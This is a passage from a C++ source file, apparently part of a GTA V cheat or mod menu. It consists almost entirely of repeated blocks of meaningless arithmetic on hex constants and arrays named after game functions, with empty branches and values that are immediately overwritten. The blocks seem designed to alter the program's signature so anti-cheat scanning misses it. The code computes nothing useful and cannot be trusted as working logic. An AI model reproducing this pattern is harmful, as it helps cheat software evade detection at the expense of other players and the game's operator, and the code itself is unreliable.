				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<Dynamic>true</Dynamic>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
